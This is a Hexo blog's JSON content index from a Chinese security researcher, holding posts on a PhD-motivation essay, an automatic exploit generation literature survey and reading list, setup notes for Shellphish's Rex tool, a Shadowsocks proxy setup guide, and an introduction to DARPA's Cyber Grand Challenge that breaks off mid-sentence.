{"meta":{"title":"Mr.Ma3k4H3d","subtitle":"想要把自己活成一场梦，一首歌，一部电影~","description":"Cyber Security Penetration Test Fuzzing Hacker IT","author":"Mr.Ma3k4H3d","url":"http://maskhed.github.io"},"pages":[{"title":"404","date":"2018-10-21T04:29:40.972Z","updated":"2018-10-21T04:29:40.972Z","comments":true,"path":"404.html","permalink":"http://maskhed.github.io/404.html","excerpt":"","text":""},{"title":"AEG","date":"2018-10-21T08:02:42.000Z","updated":"2018-11-10T03:35:18.180Z","comments":true,"path":"AEG/index.html","permalink":"http://maskhed.github.io/AEG/index.html","excerpt":"","text":""},{"title":"CGC","date":"2018-11-01T15:01:28.000Z","updated":"2018-11-01T15:08:42.282Z","comments":true,"path":"CGC/index.html","permalink":"http://maskhed.github.io/CGC/index.html","excerpt":"","text":""},{"title":"CVE","date":"2018-10-21T07:50:28.000Z","updated":"2018-10-21T07:50:44.320Z","comments":true,"path":"CVE/index.html","permalink":"http://maskhed.github.io/CVE/index.html","excerpt":"","text":""},{"title":"Fuzz","date":"2018-10-21T07:17:49.000Z","updated":"2018-11-10T03:48:18.557Z","comments":true,"path":"Fuzz/index.html","permalink":"http://maskhed.github.io/Fuzz/index.html","excerpt":"","text":""},{"title":"CVE分析","date":"2018-10-21T07:19:35.000Z","updated":"2018-11-10T03:41:02.953Z","comments":true,"path":"CVE分析/index.html","permalink":"http://maskhed.github.io/CVE分析/index.html","excerpt":"","text":""},{"title":"Github","date":"2018-10-21T07:25:05.000Z","updated":"2018-11-10T03:45:02.041Z","comments":true,"path":"Github/index.html","permalink":"http://maskhed.github.io/Github/index.html","excerpt":"","text":""},{"title":"Hexo","date":"2018-10-21T06:41:37.000Z","updated":"2018-10-21T15:01:30.222Z","comments":true,"path":"Hexo/index.html","permalink":"http://maskhed.github.io/Hexo/index.html","excerpt":"","text":""},{"title":"SS","date":"2018-10-21T07:22:01.000Z","updated":"2018-11-10T03:43:24.390Z","comments":true,"path":"SS/index.html","permalink":"http://maskhed.github.io/SS/index.html","excerpt":"","text":""},{"title":"Vim","date":"2018-10-21T06:41:37.000Z","updated":"2018-10-21T06:43:02.769Z","comments":true,"path":"Vim/index.html","permalink":"http://maskhed.github.io/Vim/index.html","excerpt":"","text":""},{"title":"about","date":"2018-10-21T14:00:54.755Z","updated":"2018-10-21T08:10:16.402Z","comments":true,"path":"about/index.html","permalink":"http://maskhed.github.io/about/index.html","excerpt":"","text":""},{"title":"history","date":"2018-10-21T08:33:13.000Z","updated":"2018-10-21T08:37:17.638Z","comments":true,"path":"history/index.html","permalink":"http://maskhed.github.io/history/index.html","excerpt":"","text":""},{"title":"二进制安全","date":"2018-11-09T02:26:55.000Z","updated":"2018-11-10T03:34:33.662Z","comments":true,"path":"二进制安全/index.html","permalink":"http://maskhed.github.io/二进制安全/index.html","excerpt":"","text":""},{"title":"成长轨迹","date":"2018-11-08T02:26:55.000Z","updated":"2018-11-08T01:01:38.974Z","comments":true,"path":"成长轨迹/index.html","permalink":"http://maskhed.github.io/成长轨迹/index.html","excerpt":"","text":""},{"title":"杂货铺","date":"2018-10-21T06:33:54.000Z","updated":"2018-11-10T03:37:35.007Z","comments":true,"path":"杂货铺/index.html","permalink":"http://maskhed.github.io/杂货铺/index.html","excerpt":"","text":""},{"title":"论文阅读","date":"2018-10-21T06:26:55.000Z","updated":"2018-11-10T03:36:32.023Z","comments":true,"path":"论文阅读/index.html","permalink":"http://maskhed.github.io/论文阅读/index.html","excerpt":"","text":""}],"posts":[{"title":"即使风雨兼程，也能守得云开见月明","slug":"风雨兼程","date":"2020-12-08T00:58:56.000Z","updated":"2018-11-10T08:13:31.090Z","comments":true,"path":"2020/12/08/风雨兼程/","link":"","permalink":"http://maskhed.github.io/2020/12/08/风雨兼程/","excerpt":"本文是某次刷知乎时偶然看到的，虽然作者以“读博”为例，但“修真之旅”却并不仅限于此。每次读来都深以为然，无论如何，愿自己在“修真之旅”中也能够“守得云开见月明”。","text":"本文是某次刷知乎时偶然看到的，虽然作者以“读博”为例，但“修真之旅”却并不仅限于此。每次读来都深以为然，无论如何，愿自己在“修真之旅”中也能够“守得云开见月明”。 读博士期间的抑郁非常普遍，我读博的头两年也是如此，每天暗无天日，浑浑噩噩。现在回头想想，这种不开心是“根儿”上的，是读博士⽆法避免的。 首先，“博士”到底是个什么东西呢?我刚到耶鲁的时候，研究生院的院长Tom Pollard曾经为我们解释过，他说“当你可以把Dr.放在名字的前面时，就意味着你成为了一位独⽴科学家 (independent scientist)!” 之前我⼀直把注意力放在“科学家”上，觉得离童年的梦想越来越近了。直到最近我才意识到这句话的关键不在“科学家”，而在“独立”二字!其实你在读博士之前就已经可以搞科研了，你可以大量地阅读文献，可以做⼀些尝试性的实验，甚至是发表学术论文。但是这些并不是博士培养的全部，甚至都不是博⼠培养的重点!重点是“独立”二字，也就是在问题描述里反复出现的“孤独”，“⼀个人”之类的不开心的源泉。这种不开心是“根⼉”上的，是无法避免的!当你开始博士的修真之旅后，你就会像他一样: 独立意味着你要在这茫茫沙漠中独自寻找前进的方向，你的每一步都可能是人类全新的征途;独立意味着你要在这全新的征途中独自克服一切困难，没有人能告诉你面前的那座山要怎么去翻;独立意味着当你千辛万苦翻过那座山后，⽆论看到的是绿洲还是另一⽚沙漠，你都只能独自享受，无法同任何人分享。这条路，你要一个人走!那种被边缘化、被世界遗弃的感觉会一直伴随着你，直到你放弃或者走不动了为止。你可能会问，不是还有博士生导师吗?而我要告诉你的是，导师其实就是那个远在56,000,000公里以外的地球指挥官: 他说:“去火星吧!” 你就踏上了征途。之后他能做的就是不定期看看你是不是还活着，是不是还在继续前进。虽然他可以时不时地为你指引方向，为你提供援助，甚至是在你翻⼭越岭时为你加油鼓气，在你抵达绿洲时为你欢呼雀跃。但每一步路你都要自己走，每种苦你都得自己吃。更重要的是，当陪伴你一段旅程后，除了精神上的支持，那个远在56,000,000公里以外的导师什么都做不了，你终归还是要独立的!这条路上，你不仅要忍耐孤独，还要学会享受孤独。 你要练就自娱自乐甚至是⾃黑的能力: 还要不断寻找前进的动力，精神的寄托: 当你终于找到那片绿色时，即使无人可以分享，你也会觉得这一切的一切都是值得的: 愿你一路好走!即使风雨兼程，也能守得云开⻅⽉明!","categories":[{"name":"成长轨迹","slug":"成长轨迹","permalink":"http://maskhed.github.io/categories/成长轨迹/"}],"tags":[]},{"title":"ReadingList","slug":"ReadingList","date":"2020-11-04T13:21:36.000Z","updated":"2018-11-16T07:19:33.609Z","comments":true,"path":"2020/11/04/ReadingList/","link":"","permalink":"http://maskhed.github.io/2020/11/04/ReadingList/","excerpt":"驽马十驾功在不舍，将待阅的书籍、论文、资料梳理成列表，督促自己一篇篇完成。（2018/11/16更新）","text":"驽马十驾功在不舍，将待阅的书籍、论文、资料梳理成列表，督促自己一篇篇完成。（2018/11/16更新） 待阅1）论文 《AEG: Automatic Exploit Generation》 - 进行中… 《CRAX: Software Crash Analysis for Automatic Exploit Generation by Modeling Attacks as Symbolic Continuations》 《Automatic Generation of Control Flow Hijacking Exploits for Software Vulnerabilities》 《Automatic Polymorphic Exploit Generation for Software Vulnerabilities》 《Data-Oriented programming: On the expresivenes of non-control data attacks》 《Automatic Generation of Data-Oriented Exploits》 MachineLearning 《利用深度神经网络监测 ROP Payloads》 《Driller: Augmenting Fuzzing Through Selective Symbolic Execution》 Debug 《动态二进制插桩的原理和基本实现》 2）资料 《Fuzzing技术总结与工具列表》 Attack 历年针对 PC 端和服务器攻击技术相关的 Paper 收集整理 Fuzzing 《使用神经程序学习来实现的有效 Fuzz》 Fuzzing 《T-Fuzz： fuzzing by program transformation》 已阅 《Survey of Automated Vulnerability Detection and Exploit Generation Techniques in Cyber Reasoning Systems》 - 针对CGC的综述 《软件与网络安全研究综述》 - 有助于迅速了解软件与网络安全现状 《(State of) The Art of War: Offensive Techniques in Binary Analysis》 - 综述了二进制漏洞挖掘相关技术并介绍了 Angr 实现原理 留存 MachineLearning 防止对基于 AI 的威胁情报系统的投毒攻击(paper) Malware 利用 AI 来攻击 IA：一种针对智能手机中语音辅助功能的新间谍软件(Paper) Wild Patterns: 机器学习对抗兴起的10年（paper） MachineLearning 神经网络下的恶意脚本分类研究：JavaScript 与 VBScript Hardware 《Nethammer：通过网络请求引发 Rowhammer 攻击》 《BitBlaze：A New Approach to Computer Security via Binary Analysis》","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[]},{"title":"漏洞自动化利用","slug":"AEG-Research-Status","date":"2018-11-16T06:41:02.000Z","updated":"2018-11-16T06:54:52.707Z","comments":true,"path":"2018/11/16/AEG-Research-Status/","link":"","permalink":"http://maskhed.github.io/2018/11/16/AEG-Research-Status/","excerpt":"二进制漏洞的挖掘与利用始终是网络安全的核心内容之一。目前，漏洞挖掘的自动化程度已经较高，各类并行 Fuzz 平台已能够高效产出大量 Crash。面对 Crash，如何快速判定其可利用性，并编写利用程序是亟待解决的问题。Crash 的可利用性判定属于另一个研究方向，相关内容本文并不涉及。针对 Exploit 的自动生成问题，学术界有一个专有名词：Automatic Exploit Generation。AEG 是安全研究领域首次将“利用自动生成”作为一个研究课题，也代表着漏洞利用自动化的研究逐步拉开序幕。下文将针对 AEG 的研究历程进行简要介绍。","text":"二进制漏洞的挖掘与利用始终是网络安全的核心内容之一。目前，漏洞挖掘的自动化程度已经较高，各类并行 Fuzz 平台已能够高效产出大量 Crash。面对 Crash，如何快速判定其可利用性，并编写利用程序是亟待解决的问题。Crash 的可利用性判定属于另一个研究方向，相关内容本文并不涉及。针对 Exploit 的自动生成问题，学术界有一个专有名词：Automatic Exploit Generation。AEG 是安全研究领域首次将“利用自动生成”作为一个研究课题，也代表着漏洞利用自动化的研究逐步拉开序幕。下文将针对 AEG 的研究历程进行简要介绍。 1、 APEGAPEG 是 D.Brumley 等人在 2008 年的 IEEE S&amp;P 会议上首次提出的基于二进制补丁比较的漏洞利用自动生成方法。该方法利用二进制差异比较查找补丁位置，通过分析补丁代码，生成能够触发漏洞的输入数据，结合污点分析技术生成可利用程序。虽然 APEG 的核心思想较为简单，但由于具备较强的可操作性而得到普遍认可。相关论文《Automatic Patch-Based Exploit Generation is Possible: Techniques and Implications》 2、 AEG为了克服 APEG 对于补丁的依赖以及无法构造控制流劫持的缺陷， T.Avgerinos 等人在 2011 年的 NDSS 会议上提出了 AEG，一种基于源码的劫持控制流的自动利用方案。AEG 采用了前向符号执行与动态指令插桩技术，能够生成具备控制流劫持能力的利用样本，是第一个真正意义上的面向控制流劫持的自动化构建方案。相关论文《AEG: Automatic Exploit Generation》 3、 Mayhem由于 AEG 依赖程序源代码并受限于编译器等环境因素。S.K.Cha 等人在 2012 年的 IEEE S&amp;P 会议上提出了基于二进制的自动利用方案 Mayhem。该方案采用在线式符号执行与离线式符号执行技术，通过内存建模实现较为实用的自动利用方案。相关论文《Unleashing MAYHEM on Binary Code》 4、 PolyAEG实现漏洞自动利用方案的重要性不言而喻，对于漏洞危害评估来说，生成高质量、多样性的漏洞利用样本同样意义重大。因此，M.HWang 等人在 2013 年 SecureComm 会议上提出了多样性利用样本自动生成方法 PolyAEG。该方案通过对 8 个漏洞样本进行试验，针对单个控制流劫持漏洞最多生成 4724 个利用样本，为漏洞危害评估提供了有效支持。相关论文《Automatic Polymorphic Exploit Generation for Software Vulnerabilities》 5、 FlowStitch2015 年 H.Hu 等人在 USENIX Security 会议上首次提出了面向数据流利用的自动化利用方案 FlowStitch。通过在 8 个真实漏洞样本上进行试验，FlowStitch 自动构建的 19 个利用样本不仅可以绕过数据执行以及细粒度控制流完整性等防护手段，并且其中 10 个利用样本还可以在开启地址随机化的环境下成功执行。相关论文《Automatic Generation of Data-Oriented Exploits》 6、Angr2016 年 Shoshitaishvili 等人在 IEEE S&amp;P 会议上提出了 Offensive Binary Analysis 技术，并开源了二进制分析平台 Angr。 作者所在团队所设计的 Cyber Reasoning System（CRS）Mechaphish 于 2016 年 DARPA 举办的 CGC 竞赛中荣获第三名。Mechaphish 系统中负责漏洞自动化利用的模块 Rex 正是基于 Angr 而实现。相关论文《(State of) The Art of War: Offensive Techniques in Binary Analysis》 7、 Q为了应对漏洞缓解技术，特别是数据执行保护与地址随机化，E.J.Schwartz 等人在 2011 年的 USENIX Security 会议上提出了一套面向高可靠性漏洞利用的 ROP 代码自动生成方法 Q。严格来讲，ROP 代码生成方案应当属于 Exploit Hardening 而非 Exploit Generation。但面对当前越来越严格的漏洞利用缓解技术，ROP 为利用样本的稳定执行提供了有效的支撑。相关论文《 Q: Exploit hardening made easy》 自首次提出基于二进制补丁比对的漏洞自动化利用方案至今的十年间，针对 AEG 的研究已取得了明显的进展，但相较于漏洞利用的复杂性、安全防御技术的不断演进，要想使得 AEG 在复杂多变的网络对抗中产生实际应用尚有很多问题等待解决。 本人属于刚接触二进制安全的菜鸟，文中内容主要参考中科院软件所苏璞睿老师的《软件漏洞自动利用研究进展》，所涉及论文正在逐步阅读中，力争在后续的学习过程中再产出一些阶段性的总结。 参考文献：《自动化漏洞利用的重大挑战回顾》《软件漏洞自动利用研究进展》《Automatic Exploit Generation：漏洞利用自动化》","categories":[{"name":"论文阅读","slug":"论文阅读","permalink":"http://maskhed.github.io/categories/论文阅读/"}],"tags":[{"name":"AEG","slug":"AEG","permalink":"http://maskhed.github.io/tags/AEG/"}]},{"title":"Rex 源代码分析（一）","slug":"rex-1","date":"2018-11-10T03:24:23.000Z","updated":"2018-11-10T04:04:57.023Z","comments":true,"path":"2018/11/10/rex-1/","link":"","permalink":"http://maskhed.github.io/2018/11/10/rex-1/","excerpt":"对于研究 Automatic Exploit Generation （AEG）的同学来说，学习并理解 Rex 的工作原理必不可少。既然要学习 Rex 那就不得不提起 Shellphish。Shellphish 是由加州大学圣芭芭拉分校学生组成的团队，该团队不仅是传统的 CTF 强队，同时在学术研究方面也底蕴深厚，二进制分析领域的大佬 Christopher Kruegel 为该团队的指导教授之一。Shellphish 为了参与美国漏洞自动攻防竞赛（CGC），设计并实现了 CRS 系统 Mechaphish，而 Rex 正是该系统中负责自动化漏洞利用的模块。本文为学习过程中的笔记，由于接触时间不久，难免在理解上存在不当之处，还需在后续学习过程中逐步完善。","text":"对于研究 Automatic Exploit Generation （AEG）的同学来说，学习并理解 Rex 的工作原理必不可少。既然要学习 Rex 那就不得不提起 Shellphish。Shellphish 是由加州大学圣芭芭拉分校学生组成的团队，该团队不仅是传统的 CTF 强队，同时在学术研究方面也底蕴深厚，二进制分析领域的大佬 Christopher Kruegel 为该团队的指导教授之一。Shellphish 为了参与美国漏洞自动攻防竞赛（CGC），设计并实现了 CRS 系统 Mechaphish，而 Rex 正是该系统中负责自动化漏洞利用的模块。本文为学习过程中的笔记，由于接触时间不久，难免在理解上存在不当之处，还需在后续学习过程中逐步完善。 一、本地环境搭建搭建 Rex 本地运行环境可以有两种选择，一是搭建完整的 Mechaphish 本地运行环境，参考文档；二是仅安装 Rex，参考文档；本文所涉及的环境搭建较为尴尬，搭建初始是计划完整安装 Mechaphish 的，虽然花费不少时间但却始终存在bug，所幸 Rex 运行无误，考虑到时间成本与核心目标，因此未在 Mechaphish 的搭建上花费时间，若后续有需求再考虑完整安装 Mechaphish。 操作系统本地安装环境采用 Ubuntu 16.04.5 Desktop(64 bit)，启用root用户。 安装脚本安装文档，文档中提供的依赖不全，需添加 angr-dev/setup.sh中的依赖： 1234567Please install the following packages: virtualenvwrapper python3-pip python3-dev \\ build-essential libxml2-dev libxslt1-dev \\ git libffi-dev cmake libreadline-dev libtool \\debootstrap debian-archive-keyring libglib2.0-dev \\libpixman-1-dev libqt4-dev binutils-multiarch \\ nasm libssl-dev libc6:i386 libgcc1:i386 \\ libstdc++6:i386 libtinfo5:i386 zlib1g:i386 参考文档，依次执行以下命令： 1234567891011121314151617git clone https://github.com/angr/angr-dev.gitcd angr-dev./setup.sh -e cgc -r https://github.com/shellphish \\ -r https://github.com/mechaphish \\ -r https://github.com/salls -D ana \\ idalink cooldict mulpyplexer monkeyhex \\ superstruct shellphish-afl shellphish-qemu \\ capstone unicorn peewee archinfo vex pyvex \\ cle claripy simuvex angr angr-management \\ angr-doc binaries identifier fidget angrop \\tracer fuzzer driller compilerex povsim rex \\ farnsworth patcherex colorguard common-utils \\ network_poll_creator patch_performance worker \\meister ambassador scriba virtual-competition \\manual-interaction 安装过程中 shellphish-afl、shellphish-qemu 所需时间较长。若安装时中出现缺少依赖错误，可先安装依赖，之后再次执行以上命令。整个安装过程虽然花费时间较多，但还算顺利，待完成时 Mechaphish 的主要组件均已安装完成，但若想顺利运行 Mechaphish，后续还有不少配置工作要做。所幸，至此已能够满足 Rex 的运行。 二、Rex 概述通过学习相关文献，初步推断 Rex 核心功能的实现依托于 Angr。以下为 Rex 所依赖的组件及功能： 组件名称 功能 angr A powerful and user-friendly binary analysis platform! tracer Utilities for generating dynamic traces. angrop angrop is a rop gadget finder and chain builder. compilerex POV templates and compilation support for CGC binaries. compilerex is a hacky cgc binary compiler povsim POV simulation for CGC. 源码中（Vulnerability.py)定义的漏洞类型，推测Rex依据以下漏洞类型进行针对性的自动化利用（内容待明确后完善）: Vulnerability Content Ref IP_OVERWRITE PARTIAL_IP_OVERWRITE UNCONTROLLED_IP_OVERWRITE BP_OVERWRITE PARTIAL_BP_OVERWRITE WRITE_WHAT_WHERE Arbitrary Memory Overwrite, also known as Write-What-Where vulnerability. Basic exploitation concept for this would be to overwrite a pointer in a Kernel Dispatch Table (Where) with the address to our shellcode (What). Ref WRITE_X_WHERE execute exception (Execute) and write exception (write-x-where). Ref UNCONTROLLED_WRITE a write where the destination address is uncontrolled ARBITRARY_READ NULL_DEREFERENCE double free ARBITRARY_TRANSMIT transmit where the buf argument is completely controlled ARBITRARY_RECEIVE receive where the buf argument is completel controlled 三、源码阅读目前尚未深入分析，以下为两个重要类 Crash、Exploit 的注释。1、Crash 类 12345678910111213141516171819202122232425262728293031Triage a crash using angr. def __init__(self, binary, crash=None, pov_file=None, aslr=None, constrained_addrs=None, crash_state=None, prev_path=None, hooks=None, format_infos=None, rop_cache_tuple=None, use_rop=True, fast_mode=False, explore_steps=0, angrop_object=None, argv=None, concrete_fs=False, chroot=None, rop_cache_path=None, trace_timeout=10, input_type=CrashInputType.STDIN, port=None, use_crash_input=False, tracer_args=None, initial_state=None): \"\"\" :param binary: Path to the binary which crashed. :param crash: String of input which crashed the binary. :param pov_file: CGC PoV describing a crash. :param aslr: Analyze the crash with aslr on or off. :param constrained_addrs: List of addrs which have been constrained during exploration. :param crash_state: An already traced crash state. :param prev_path: Path leading up to the crashing block. :param hooks: Dictionary of simprocedure hooks, addresses to simprocedures. :param format_infos: A list of atoi FormatInfo objects that should be used when analyzing the crash. :param rop_cache_tuple: A angrop tuple to load from. :param use_rop: Whether or not to use rop. :param explore_steps: Number of steps which have already been explored, should only set by exploration methods. :param angrop_object: An angrop object, should only be set by exploration methods. :param argv: Optionally specify argv params (i,e,: ['./calc', 'parm1']). :param concrete_fs: Use the host's filesystem for analysis :param chroot: For concrete_fs: use this host directory as the guest root :param trace_timeout: Time the tracing operation out after this number of seconds \"\"\" 2、Exploit 类 12345678910An Exploit object represents the successful application of an exploit technique to a crash state. It contains the logic for extracting an understanding of how to interact with a state in order to reproduce it concretely, and then the logic for encoding that understanding as an exploit script. def __init__(self, crash, bypasses_nx, bypasses_aslr): \"\"\" :param crash: a crash object which has been modified to exploit a vulnerability :param bypasses_nx: does the exploit bypass NX? :param bypasses_aslr: does the exploit bypass ASLR? \"\"\" 四、测试脚本分析测试用例使用 Angr 提供的官方用例。下表为工程中用以测试的脚本，后续将针对各个测试脚本进行分析： 所属目录 脚本名称 功能 ./rex/tests/ test_tex.py 测试函数合集 ./rex/tests/ test_explore.py Exploit shadowstack. ./rex/tests/ test_chall_resp.py Test Challenge-Response Buffer Overflow Vulnerabilities. ./rex/tests/ slow_test_cromu71.py Test exploitation of CROMU_00071 ./rex/tests/ manual_type2_fuzzer.py Type2CrashFuzzer tests/i386/controlled_printf ./rex/tests/ manual_type1_fuzzer.py Type1CrashFuzzer /tests/cgc/CROMU_00071 ./rex/tests/ manual_type1_fuzzer2.py Type1CrashFuzzer ./NRFIN_00075_crash ./rex/tests/ manual_eagle5.py 四、补充知识：1、ShadowStack： Keeps extra copy of return address in separate memory space Only allows a return if address matches up So, this is the foolproof solution? Limitations: Does not protect other data Local variables. Heap overflow overwrites function pointers. 2、ROP攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段，称之为 gadget。","categories":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://maskhed.github.io/categories/二进制安全/"}],"tags":[{"name":"CGC AEG","slug":"CGC-AEG","permalink":"http://maskhed.github.io/tags/CGC-AEG/"}]},{"title":"基于搬瓦工的 ShadowSocks 搭建","slug":"SS搭建","date":"2018-11-06T05:51:56.000Z","updated":"2018-11-10T03:51:22.240Z","comments":true,"path":"2018/11/06/SS搭建/","link":"","permalink":"http://maskhed.github.io/2018/11/06/SS搭建/","excerpt":"在日常工作与学习过程中，没有Google实在不方便，之前一直使用IPv6作为替代解决方案，但在不支持IPv6的网络中很是尴尬，于是决定利用 VPS 结合 SS（ShadowSocks）搭建属于自己的梯子，做个相对长久的解决方案。","text":"在日常工作与学习过程中，没有Google实在不方便，之前一直使用IPv6作为替代解决方案，但在不支持IPv6的网络中很是尴尬，于是决定利用 VPS 结合 SS（ShadowSocks）搭建属于自己的梯子，做个相对长久的解决方案。 0x00 VPS选购想要访问谷歌等网站，首先需要一台国外的 VPS。目前提供国外 VPS 的主机商有很多，如国内的阿里云、腾讯云等，但服务价格相对较高，入门级ECS包年费用基本在300+rmb。 作为仅提供简单的SS服务，性价比有待商榷。因此选择价位更加亲民且稳定不跑路的主机提供商“搬瓦工”，其优势如下： 按月收费，价格低廉，当前最低年付 19.99 美元 服务稳定，速度较快 可一键切换机房，每 10 周可免费换一次 IP 与“搬瓦工”同样出名的还有“ VULTR ”，相较于“搬瓦工”，“ VULTR ”的优势在于 VPS 可以随时创建与删除，0.01 美元即可换 IP 一次。 整体上来说，想要速度快的选择搬瓦工，怕 IP 被封则选择 VULTR。综合考虑各种因素，最终选购了“搬瓦工”的“Basic VPS-Self-managed-10G KVM-PROMO”，如何选择VPS配置及购买完成后对VPS的设置网上教程较多，可自行百度。由于“搬瓦工”支持支付宝，因此很是方便。 0x01 SS服务端配置在完成VPS购置后，接下来要做的是安装SS服务端并进行配置。基于个人习惯，将 VPS 操作系统设置为 Ubuntu 16.04 x86_64，下文就以该OS版本为例进行说明。1、安装SS服务端首先提供SS官方网站、GitHub地址。SS服务端安装相对简单，通常情况下依次执行如下命令即可：12345apt-get updateapt install python-pippip install --upgrade pippip install setuptoolspip install shadowsocks 执行完毕后，若无异常则表明安装成功。2、配置SS服务端SS配置文件为json格式，在“/etc” 或当前用户目录下创建配置文件，如“ shadowsock.json ”，并填写配置信息，格式参考github官方实例。 123456789101112131415161718192021222324252627&#123; \"server\":\"you_server_ip\", \"port_password\":&#123; \"8388\":\"you_password\", \"8389\":\"you_password\", \"8390\":\"you_password\", \"8391\":\"you_password\", \"8392\":\"you_password\" &#125;, \"localhost_address\":\"127.0.0.1\", \"local_port\":1080, \"timeout\":300, \"method\":\"aes-256-cfb\", \"fast_open\":false, \"workers\":20 &#125; ##############以下为说明文字，请忽略you_server_ip：是你的服务器登录地址localhost_address：127.0.0.1请保持默认local_port：1080请保持默认server_port：8381根据需要进行修改you_password：个人设置密码timeout：300请保持默认method：aes-256-cfb请保持默认fast_open：false请保持默认 官方说明中，各字段含义如下： Name Explanation server the address your server listens server_port server port local_address the address your local listens local_port local port password password used for encryption timeout in seconds method default: “aes-256-cfb” fast_open use TCP_FASTOPEN, true / false workers number of workers, available on Unix/Linux 配置完毕后，需启动SS服务，命令如下： 1234# //前台启动ssserver -c /etc/shadowsock.json# //后台启动ssserver -c /etc/shadowsock.json -d start/stop 在Ubuntu系统下设置SS服务开机自启动：123vi /etc/rc.local# //添加以下记录：ssserver -c /etc/shadowsocks.json -d start 3、遇到的问题由于RP问题，在安装过程中遇到以下问题：（1）更新pip报错更新 pip 后，使用 pip 安装python包时报错： 1ImportError: cannot import name main 解决方案：修改“/usr/bin”目录下pip文件。 将如下三行 123from pip import mainif __name__ == '__main__': sys.exit(main()) 修改为 123from pip import __main__if __name__ == '__main__': sys.exit(__main__.main()) 保存退出，重新登录终端后成功解决异常。 （2） locale命令报错 locale指令运行出现的错误信息：123locale：Cannot set LC_CTYPE to default locale： No such file or directorylocale：Cannot set LC_MESSAGES to default locale： No such file or directorylocale：Cannot set LC_ALL to default locale： No such file or directory locale是用来设置软件运行的语言环境，因此判断语言环境设置存在问题。重新设置语言环境，执行如下命令：12345# 针对特定用户[root@Mylinux ~]#echo \"export LC_ALL=en_US.UTF-8\" &gt;&gt; /home/XXX/.bash_profile# 针对所有用户[root@Mylinux ~]# echo \"export LC_ALL=en_US.UTF-8\" &gt;&gt; /etc/profile（所有用户）[root@Mylinux ~]# exit 退出后重新登录终端，成功解决异常。 0x02 SS客户端配置安装SS服务端并确保服务正确启动后，接下来需要配置SS客户端。SS客户端所支持的系统类型如下：结合日常使用习惯，主要针对OSX、IOS两个版本进行说明。1、Mac OS XOSX下SS客户端的安装较简单，在官方地址下载SS客户端，成功安全后点击导航栏中的“小飞机”图标，配置SS服务器相关信息。正确配置后，即可访问Google等站点。 2、IOS相较Mac OS X，IOS的配置略显繁琐，主要原因在于仅美区AppleID才能够下载SS客户端。因此，首先需要注册一个美区账户。(1)注册美区ID创建过程同样很简单，通过苹果官方网站新建AppleID。创建过程中将账户所属区域设为美国即可。（2)IOS客户端iOS中的Shadowsocks客户端，也有多种。可以参考Shadowsocks官网中：Shadowsocks - Clients介绍的： Wingy： App Store MobileShadowSocks Big Boss 不过想要使用支持最新加密方式的客户端的话，目前仅有shadowrocket与Potatso Lite两款。利用之前注册的美区AppleID下载免费的Potatso Lite，配置SS服务器信息后，即可顺利访问Google等站点。","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[{"name":"SS","slug":"SS","permalink":"http://maskhed.github.io/tags/SS/"}]},{"title":"Cyber Grand Challenge 简介","slug":"CGC","date":"2018-11-01T15:03:15.000Z","updated":"2018-11-10T03:46:01.791Z","comments":true,"path":"2018/11/01/CGC/","link":"","permalink":"http://maskhed.github.io/2018/11/01/CGC/","excerpt":"","text":"2016年8月在美国拉斯维加斯举办的 Defcon CTF，一支名为 Mayhem 的机器人战队与另外十四支人类顶尖CTF战队上演了信息安全领域首次人机黑客对战。该事件在人工智能和信息安全领域具有里程碑式的意义，是机器智能开始深入影响信息安全的标志性事件之一。代表机器智能的 Mayhem，正是由美国国防部先进项目研究局（DARPA，Defense Advanced Research Projects Agency）举办的网络超级挑战赛（CGC，Cyber Grand Challenge）的冠军。 背景 CGC(Cyber Grand Challenage) 是DARPA于2013年发起的全球性网络安全挑战赛，旨在推进自动化网络防御技术发展，即实时识别系统缺陷、漏洞，并自动完成修补和系统防御，利用CRS（Cyber Reasoning System）实现全自动的网络安全攻防。主要涉及以下技术： Dynamic Analysis Static Analysis Symbolic Execution Constraint Solving Data Flow Tracking Fuzz Testing 赛程CGC 的赛程分为两个阶段：初赛（Challenge Qualification Event，CQE）和决赛（Challenge Final Event，CFE）。在比赛之前，每支参赛团队需要开发一套全自动的网络推理系统CRS（Cyber Reasoning System），实现对 Linux 二进制程序的自动化分析及漏洞检测，自动生成PoC，并对漏洞进行修补。 Challenge Qualification Event（CQE）POV（Proof of Vulnerability）是CGC竞赛的核心，可类比为常规CTF比赛中所需编写的Exploit。在CQE中，参赛团队的CRS被放置在单独的环境中进行评估，CRS在此环节中需要自动分析待检测的二进制程序CB（Challenge Banary），生成POV及修补过的CB。CQE阶段侧重于考察团队的漏洞挖掘能力及生成补丁的能力。下表为DARPA在CQE和CFE分別要测试的项目： Challenge Final Event（CFE）CFE和CQE最大的不同在于各参赛团队的CRS会部署于同一网络环境之内，各队将生成的POV提交给主办方，主办方将这些POV混入正常的服务流量，再分配给各队的CRS，以实现相互之间的网络攻防。若CRS能够在正常流量中检测出攻击流量，并进行有效阻断，则认为CRS成功实现了网络防御。 下图为CFE的评分标准。参赛队伍首先生成POV，若此POV成功便可获得部分得分。之后 Mixing Appliance 会将主办方以及各队的POV混合至正常的服务流量中（Service Poller）并发送给各队。各队首先从网络防御系统接收到流量，并可以做一定程度的过滤，若能成功过滤POV，则可获取相应的得分，反之则会被扣除相应的分数。而未过滤的流量会进入到 Patch CB 中。同样，成功过滤POV则得分，否则扣分。最后会确认应用程序状态，若应用程序能够提供正常服务则可以获得相应分数，否则扣除相应分数。 技术由于本文主要介绍CGC相关情况，其中所涉及的技术过于庞杂，难以一一说明。因此以此图为索引，概要的展示各环节所涉及的主要技术，感兴趣的读者可对相关技术进行深入研究。 决赛团队简介初赛阶段的参赛队伍分为资助(Funded Track)和公开(Open Track)两种。Funded Track 是预先向DARPA提交项目申请并获得75万美元资助的团队；Open Track 则是面向全球公开报名，由民间自由组织的团队；共有队伍近100支，包括至少18支来自欧洲、亚洲等非北美地区的队伍；Open Track 有传统CTF强队（disekt，shellphish等），也有由知名安全企业资助的比赛团队。由 DARPA 官方宣布的CGC最终比赛结果如下：第1名：卡内基梅隆大学 ForAllSecure 团队研制的 Mayhem 系统；第2名：GrammaTech 公司和弗吉尼亚大学 TECHx 团队研制的 Xandra 系统；第3名：加利福尼亚大学 Shellphish 学生团队研制的Mechanical Phish系统。以下为七支进入决赛团队的简介： CodeJitsu（Berkeley, Calif.）：来自加州伯克利大学，指导教授为Dawn 